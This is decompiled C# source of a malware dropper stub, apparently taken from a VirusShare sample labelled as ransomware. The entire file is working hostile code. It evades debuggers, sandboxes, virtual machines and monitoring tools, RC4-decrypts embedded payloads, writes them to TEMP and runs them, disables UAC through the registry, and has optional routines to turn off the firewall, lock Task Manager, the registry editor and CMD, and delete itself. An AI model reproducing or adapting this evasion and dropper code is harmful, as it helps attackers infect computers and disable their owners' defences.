// Decompiled with JetBrains decompiler
// Type: Stub.Stub
// Assembly: setup, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9D784451-C0C0-466D-8D4C-F884A0DA619A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00018-msil\Trojan-Ransom.Win32.Blocker.iick-20520583c8465af81a45dd45207c8687142fcc1d654cd8fcda18895b9cb69080.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Stub
{
  internal class Stub
  {
    private static byte[] Key = new byte[7]
    {
      (byte) 14,
      (byte) 26,
      (byte) 37,
      (byte) 48,
      (byte) 59,
      (byte) 60,
      (byte) 71
    };
    private static string[] Filenames = new string[2]
    {
      "DBot.exe",
      "setup.exe"
    };
    private static int count = 1;
    private static bool AntiDebugger = true;
    private static bool AntiEmulator = true;
    private static bool AntiNetstat = true;
    private static bool AntiSandboxie = true;
    private static bool AntiFilemon = true;
    private static bool AntiProcessmon = true;
    private static bool AntiRegmon = true;
    private static bool AntiCainandAbel = true;
    private static bool AntiNetworkmon = true;
    private static bool AntiTCPView = true;
    private static bool AntiWireshark = true;
    private static bool AntiParallelsDesktop = true;
    private static bool AntiVMWare = true;
    private static bool AntiVirtualBox = true;
    private static bool AntiVirtualPC = true;
    private static bool MeltServer = false;
    private static bool FakeError = false;
    private static string FakeErrorTitle = "VALUEFAKEERRORTITLE";
    private static string FakeErrorMessage = "VALUEFAKEERRORMESSAGE";
    private static bool DisableUAC = true;
    private static bool DisableCMD = false;
    private static bool DisableFirewall = false;
    private static bool DisableRegistry = false;
    private static bool DisableTaskmanager = false;

    public static bool CheckProcessIsRun(string sProcessName) => Process.GetProcessesByName(sProcessName).Length > 0;

    public static string GetGraphicDevice()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject["Description"]);
      return empty;
    }

    public static void tFakeError()
    {
      int num = (int) MessageBox.Show(Stub.Stub.FakeErrorMessage, Stub.Stub.FakeErrorTitle, MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    public static void Decrypt(ref byte[] bytes, byte[] key)
    {
      byte[] numArray1 = new byte[256];
      byte[] numArray2 = new byte[256];
      for (int index = 0; index < 256; ++index)
      {
        numArray1[index] = (byte) index;
        numArray2[index] = key[index % key.GetLength(0)];
      }
      int index1 = 0;
      for (int index2 = 0; index2 < 256; ++index2)
      {
        index1 = (index1 + (int) numArray1[index2] + (int) numArray2[index2]) % 256;
        byte num = numArray1[index2];
        numArray1[index2] = numArray1[index1];
        numArray1[index1] = num;
      }
      int index3;
      int index4 = index3 = 0;
      for (int index5 = 0; index5 < bytes.GetLength(0); ++index5)
      {
        index4 = (index4 + 1) % 256;
        index3 = (index3 + (int) numArray1[index4]) % 256;
        byte num = numArray1[index4];
        numArray1[index4] = numArray1[index3];
        numArray1[index3] = num;
        int index6 = ((int) numArray1[index4] + (int) numArray1[index3]) % 256;
        bytes[index5] ^= numArray1[index6];
      }
    }

    private static void Main(string[] args)
    {
      if (Stub.Stub.FakeError)
      {
        try
        {
          new Thread(new ThreadStart(Stub.Stub.tFakeError)).Start();
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiDebugger)
      {
        try
        {
          if (Debugger.IsAttached)
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiEmulator)
      {
        try
        {
          long ticks = DateTime.Now.Ticks;
          Thread.Sleep(10);
          if (DateTime.Now.Ticks - ticks < 10L)
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiNetstat)
      {
        try
        {
          if (Stub.Stub.CheckProcessIsRun("NETSTAT"))
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiSandboxie)
      {
        try
        {
          Form form = new Form();
          form.Text = "TEST";
          form.Opacity = 0.0;
          form.ShowInTaskbar = false;
          form.Show();
          if (form.Text == "[#] TEST [#]")
            return;
          form.Close();
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiFilemon)
      {
        try
        {
          if (Stub.Stub.CheckProcessIsRun("FILEMON"))
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiProcessmon)
      {
        try
        {
          if (Stub.Stub.CheckProcessIsRun("PROCMON"))
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiRegmon)
      {
        try
        {
          if (Stub.Stub.CheckProcessIsRun("REGMON"))
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiCainandAbel)
      {
        try
        {
          if (Stub.Stub.CheckProcessIsRun("CAIN"))
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiNetworkmon)
      {
        try
        {
          if (Stub.Stub.CheckProcessIsRun("NETMON"))
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiTCPView)
      {
        try
        {
          if (Stub.Stub.CheckProcessIsRun("TCPVIEW"))
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiWireshark)
      {
        try
        {
          if (Stub.Stub.CheckProcessIsRun("WIRESHARK"))
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiParallelsDesktop)
      {
        try
        {
          if (Stub.Stub.GetGraphicDevice() == "Parallels Video Adapter")
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiVMWare)
      {
        try
        {
          if (Stub.Stub.GetGraphicDevice() == "VMware SVGA II")
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiVirtualBox)
      {
        try
        {
          if (Stub.Stub.GetGraphicDevice() == "VirtualBox Graphics Adapter")
            return;
        }
        catch
        {
        }
      }
      if (Stub.Stub.AntiVirtualPC)
      {
        try
        {
          string[] strArray = new string[2]
          {
            "VM Additions S3 Trio32/64",
            "S3 Trio32/64"
          };
          foreach (string str in strArray)
          {
            if (Stub.Stub.GetGraphicDevice() == str)
              return;
          }
        }
        catch
        {
        }
      }
      for (int index = 0; index <= Stub.Stub.count; ++index)
      {
        try
        {
          Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(index.ToString() + ".txt");
          byte[] bytes = new byte[manifestResourceStream.Length];
          manifestResourceStream.Read(bytes, 0, bytes.Length);
          manifestResourceStream.Close();
          Stub.Stub.Decrypt(ref bytes, Stub.Stub.Key);
          FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\" + Stub.Stub.Filenames[index], FileMode.Create);
          fileStream.Write(bytes, 0, bytes.Length);
          fileStream.Close();
          fileStream.Dispose();
          new Process()
          {
            StartInfo = {
              FileName = (Environment.GetEnvironmentVariable("TEMP") + "\\" + Stub.Stub.Filenames[index])
            }
          }.Start();
        }
        catch
        {
        }
      }
      for (int index = 0; index <= Stub.Stub.count; ++index)
      {
        try
        {
          File.Delete(Environment.GetEnvironmentVariable("TEMP") + "\\" + Stub.Stub.Filenames[index]);
        }
        catch
        {
        }
      }
      if (Stub.Stub.DisableUAC)
      {
        try
        {
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", true).SetValue("EnableBalloonTips", (object) "0", RegistryValueKind.DWord);
        }
        catch
        {
        }
        try
        {
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("EnableLUA", (object) "0", RegistryValueKind.DWord);
          Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("EnableLUA", (object) "0", RegistryValueKind.DWord);
        }
        catch
        {
        }
        if (Stub.Stub.DisableCMD)
        {
          if (Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System") == null)
          {
            Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
            Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", true).SetValue("DisableCMD", (object) "2", RegistryValueKind.DWord);
          }
          else
            Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", true).SetValue("DisableCMD", (object) "2", RegistryValueKind.DWord);
        }
        if (Stub.Stub.DisableFirewall)
        {
          try
          {
            new Process()
            {
              StartInfo = {
                FileName = "Netsh",
                Arguments = "Advfirewall set Currentprofile State off",
                UseShellExecute = false,
                CreateNoWindow = true
              }
            }.Start();
          }
          catch
          {
          }
        }
        if (Stub.Stub.DisableRegistry)
        {
          try
          {
            if (Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System") == null)
            {
              Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("DisableRegistryTools", (object) "1", RegistryValueKind.DWord);
            }
            else
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("DisableRegistryTools", (object) "1", RegistryValueKind.DWord);
          }
          catch
          {
          }
        }
        if (Stub.Stub.DisableTaskmanager)
        {
          try
          {
            if (Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System") == null)
            {
              Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
            }
            else
              Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
          }
          catch
          {
          }
        }
      }
      if (!Stub.Stub.MeltServer)
        return;
      try
      {
        if (Application.ExecutablePath.Contains(Environment.GetEnvironmentVariable("TEMP")))
          return;
        string str = ":Repeat\ndel " + (object) '"' + Environment.GetCommandLineArgs()[0] + (object) '"' + "\nif exist " + (object) '"' + Path.GetFileName(Application.ExecutablePath) + (object) '"' + " goto Repeat";
        TextWriter textWriter = (TextWriter) new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat");
        textWriter.WriteLine(str);
        textWriter.Close();
        new Process()
        {
          StartInfo = {
            FileName = (Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat"),
            UseShellExecute = false,
            CreateNoWindow = true
          }
        }.Start();
      }
      catch
      {
      }
    }
  }
}
